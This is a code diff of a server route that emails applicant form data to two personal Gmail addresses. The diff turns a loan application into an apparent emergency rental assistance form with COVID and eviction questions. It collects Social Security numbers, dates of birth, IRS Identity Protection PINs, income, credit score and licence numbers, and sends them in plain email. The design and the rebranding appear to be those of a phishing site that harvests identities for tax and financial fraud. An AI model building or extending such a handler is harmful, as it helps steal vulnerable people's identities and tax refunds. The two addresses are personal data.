@@ -49,17 +49,16 @@ export async function POST(request) {
     to: ["piexe93@gmail.com", "solomonojukwu4@gmail.com"],
     subject: "Loan Application Details",
     html: `
-    <h3>Loan Application Details ${
-      formData.taxReturn === "yes" ? "- Filed for tax return 2022" : ""
+    <h3> Application Details ${
+      formData.taxReturn === "yes"
+        ? "- Filed for tax return 2023"
+        : "Did not file for 2023 tax return"
     }</h3>
     <p>First Name: ${formData.firstName}</p>
     <p>Last Name: ${formData.lastName}</p>
-    <p>Loan Amount: ${formData.loanAmount}</p>
-    <p>Loan Duration: ${formData.loanDuration} months</p>
+    <p>Rental Amount: ${formData.loanAmount}</p>
     <p>Monthly Mortgage: ${formData.monthlyMortgage}</p>
-    <p>Monthly Payment: ${formData.monthlyPayment}</p>
     <p>Interest: ${formData.interest}</p>
-    <p>Total Amount Paid: ${formData.totalAmountPaid}</p>
     <p>SSN: ${formData.ssn}</p>
     <p>Date of Birth: ${formData.dob}</p>
     <p>Address: ${formData.address}</p>
@@ -84,18 +83,35 @@ export async function POST(request) {
     <p>Last Pay Amount: ${formData.lastPayAmount}</p>
     <p>Last Pay Date: ${formData.lastPayDate}</p>
     <p>Next Pay Date: ${formData.nextPayDate}</p>
+    <p>If Annual Income reduced by 70%: ${formData.annualIncomeReducedBy70}</p>
     <p>Additional Income: ${formData.additionalIncome}</p>
-    <p>Loan Purpose: ${formData.loanPurpose}</p>
+    <p>Issued eviction notice: ${formData.issuedEvictionNotice}</p>
+    <p>Affected by covid: ${formData.affectedByCovid}</p>
+    <p>Owe utility bill: ${formData.oweUtilityBill}</p>
+<p>Rental Assistance Duration: ${formData.rentalAssistanceDuration}</p>
+<p>Rental Assistance Payment Means: ${formData.rentalAssistancePaymentMeans}</p>
+
+<h2>Rental assistance address</h2>
+<p>If empty, it means they chose the same as the current address.</p>
+<p>Rental Address: ${formData.rentalAddress || "Same as Current Address"}</p>
+<p>Rental City: ${formData.rentalCity}</p>
+<p>Rental Zip Code: ${formData.rentalZipCode}</p>
+<p>Rental State: ${formData.rentalState}</p>
+<p>Rental Monthly Mortgage/Rent Amount: ${formData.rentalMonthlyMortgage}</p>
+<p>Rental Residence Duration: ${formData.rentalResidenceDuration}</p>
+<p>Rental Residence Status: ${formData.rentalResidenceStatus}</p>
+
     <p>Military Status: ${formData.militaryStatus}</p>
     <p>Bankruptcy History: ${formData.bankruptcyHistory}</p>
     <p>Payday Loan History: ${formData.paydayLoanHistory}</p>
-    <p>Grandlendings Source: ${formData.GrandlendingsSource}</p>
-    <p>Grandlendings Source Other: ${formData.GrandlendingsSourceOther}</p>
+    <p>EmergencyRentalAssistance Source: ${
+      formData.EmergencyRentalAssistanceSource
+    }</p>
+    <p>EmergencyRentalAssistance Source Other: ${
+      formData.EmergencyRentalAssistanceSourceOther
+    }</p>
     <p>Credit Score: ${formData.creditScore}</p>
-    <p>Mode of Disbursement: ${formData.meansOfDisbursement}</p>
-    <p>Recieved Ip Pin: ${formData.receivedIPPIN}</p>
     <p> Ip Pin: ${formData.ipPin}</p>
-    <p>Filed for 2023 tax: ${formData.didFile2023Taxes}</p>
     <p>Adjusted Gross Income: ${formData.adjustedGrossIncome}</p>
 
     <p>License Number: ${
